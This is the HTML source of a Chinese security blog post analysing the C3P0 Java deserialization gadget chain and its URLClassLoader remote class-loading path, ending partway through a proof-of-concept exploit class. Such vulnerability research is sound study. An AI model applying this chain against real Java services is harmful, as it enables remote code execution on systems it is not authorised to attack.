@@ -1,0 +1,1117 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    C3P0链 |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="C3P0链C3P0早期的数据库连接池工具包 控制管理数据库连接 避免重复多次创建销毁连接  创建一次数据源 就可以直接多次使用 依赖地址12345&lt;dependency&gt;    &lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt;    &lt;version&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C3P0链">
+<meta property="og:url" content="http://example.com/2026/05/28/C3P0%E9%93%BE/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="C3P0链C3P0早期的数据库连接池工具包 控制管理数据库连接 避免重复多次创建销毁连接  创建一次数据源 就可以直接多次使用 依赖地址12345&lt;dependency&gt;    &lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt;    &lt;version&amp;gt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528191717965.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528191817141.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528191959983.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528192301027.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528192359550.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528192632788.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528192845953.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528193114617.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528193320344.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528193410242.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528193950357.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195259529.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195323453.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195400032.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195443542.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195623241.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195741498.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195833889.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195857726.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528195931476.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528200031196.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528200100881.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202310663.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202350126.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202412739.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202621859.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202652369.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202735429.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202801219.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528202908642.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528203235360.png">
+<meta property="og:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528203331817.png">
+<meta property="article:published_time" content="2026-05-28T10:18:54.000Z">
+<meta property="article:modified_time" content="2026-05-28T13:44:55.017Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="e:\blog_back\source_posts\CB%E9%93%BE\image-20260528191717965.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="C3P0链">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">C3P0链</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#C3P0%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">C3P0链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0"><span class="toc-number">1.1.</span> <span class="toc-text">C3P0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">依赖地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DataSource"><span class="toc-number">1.1.2.</span> <span class="toc-text">DataSource</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-URLClassLoader%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">C3P0 URLClassLoader远程类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">核心类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoolBackedDataSourceBase"><span class="toc-number">1.2.2.</span> <span class="toc-text">PoolBackedDataSourceBase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.2.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">调试一下</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-jndi"><span class="toc-number">1.3.</span> <span class="toc-text">C3P0 jndi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">核心类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiRefConnectionPoolDataSource"><span class="toc-number">1.3.2.</span> <span class="toc-text">JndiRefConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-hex%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">C3P0 hex加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">核心类</span></a></li></ol></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">48</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">29</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-C3P0链" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-28T10:18:54.000Z" itemprop="datePublished">2026-05-28</time>
+    <time style="display: none;" id="post-update-time">2026-05-28</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Java%E5%AE%89%E5%85%A8/" title="Java安全">Java安全</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="C3P0链"><a href="#C3P0链" class="headerlink" title="C3P0链"></a>C3P0链</h1><h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><p>早期的数据库连接池工具包 控制管理数据库连接</p>
+<p>避免重复多次创建销毁连接 </p>
+<p>创建一次数据源 就可以直接多次使用</p>
+<h3 id="依赖地址"><a href="#依赖地址" class="headerlink" title="依赖地址"></a>依赖地址</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="DataSource"><a href="#DataSource" class="headerlink" title="DataSource"></a>DataSource</h3><p>数据源。为了提高系统性能，在真实的Java项目中通过不会使用原生的JDBC的DriverManager去连接数据库，而是使用数据源（java.sql.DataSource）来代替DriverManager管理数据库的连接。</p>
+<p>其中C3P0就是一种常见的数据源，它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个。它提供了高效管理和复用数据库连接的功能。</p>
+<p>简单使用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ComboPooledDataSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComboPooledDataSource</span>();</span><br><span class="line"></span><br><span class="line">source.setDriverClass(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">source.setJdbcUrl(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/mysql&quot;</span>);</span><br><span class="line">source.setUser(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">source.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> source.getConnection();</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="C3P0-URLClassLoader远程类加载"><a href="#C3P0-URLClassLoader远程类加载" class="headerlink" title="C3P0 URLClassLoader远程类加载"></a>C3P0 URLClassLoader远程类加载</h2><h3 id="核心类"><a href="#核心类" class="headerlink" title="核心类"></a>核心类</h3><ol>
+<li>PoolBackedDataSourceBase</li>
+<li>ReferenceIndirector$ReferenceSerialized</li>
+<li>ReferenceableUtils</li>
+</ol>
+<hr>
+<h3 id="PoolBackedDataSourceBase"><a href="#PoolBackedDataSourceBase" class="headerlink" title="PoolBackedDataSourceBase"></a>PoolBackedDataSourceBase</h3><p>重点在writeObject和readObject</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528191717965.png" alt="image-20260528191717965"></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528191817141.png" alt="image-20260528191817141"></p>
+<p>来看看这个类 <strong>ReferenceIndirector</strong></p>
+<p>上面如果没有成功序列化 则会进入异常中 </p>
+<p>进入<strong>ReferenceIndirector.indirectForm</strong></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528191959983.png" alt="image-20260528191959983"></p>
+<p>调用<strong>getReference()</strong> 被调用的对象必须要继承<strong>Reference接口</strong>才行 不然直接就异常跳出了</p>
+<p>后续会实例化一个<strong>ReferenceSerialized</strong></p>
+<p>注意这里的<strong>ref可控 其他的参数都不可控</strong></p>
+<p><strong>ref来自于ConnectionPoolDataSource成员对象</strong></p>
+<p>实例化的作用就是填入一些内容而已</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528192301027.png" alt="image-20260528192301027"></p>
+<p><strong>writeObject方法</strong>的下面又是类似的操作 只不过换成了<strong>extensions</strong> 我们这里没用到他</p>
+<p>接下来看看<strong>readObject方法</strong></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528192359550.png" alt="image-20260528192359550"></p>
+<p>判断对象里面是否有 <strong>IndirectlySerialized</strong></p>
+<p>有则调用<strong>getObject方法</strong></p>
+<p>这里实际上调用刚刚序列化的<strong>IndirectlySerialized对象</strong>的<strong>getObject方法</strong></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528192632788.png" alt="image-20260528192632788"></p>
+<p>可以看到会调用<strong>lookup方法</strong> 那么可以直接打<strong>jndi</strong>吗</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528192845953.png" alt="image-20260528192845953"></p>
+<p>刚刚也就<strong>reference</strong>是可控的地方 <strong>contextName</strong>是不可控的</p>
+<p>所以没法直接打jndi</p>
+<p>进入下面的 <code>ReferenceableUtils.referenceToObject( reference, name, nameContext, env )</code></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528193114617.png" alt="image-20260528193114617"></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528193320344.png" alt="image-20260528193320344"></p>
+<p>这个部分会获取ref对象的工厂类名和工厂类的地址也就是url了</p>
+<p>然后获取ClassLoader对象</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528193410242.png" alt="image-20260528193410242"></p>
+<p>将获取的url包装为一个URL对象 </p>
+<p>创建一个URLCLassLoader对象 传入刚刚的URL对象和类加载器</p>
+<p>这里指定类加载器尝试加载工厂类 <code>Class fClass = Class.forName( fClassName, true, cl );</code></p>
+<p>由于指定的是URLCLassLoader这个类加载器 那么他会尝试远程类加载</p>
+<p>如果成功获取到相对于的类就直接实例化</p>
+<hr>
+<p>我们只需要在PoolBackedDataSourceBase里面填入一个connectionPoolDataSource成员对象就可以了</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528193950357.png" alt="image-20260528193950357"></p>
+<p>调用setter就可以了</p>
+<hr>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span>  com.*;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.ser.Indirector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_URLClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        pool.setConnectionPoolDataSource(<span class="keyword">new</span> <span class="title class_">datapool</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(pool);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">datapool</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span 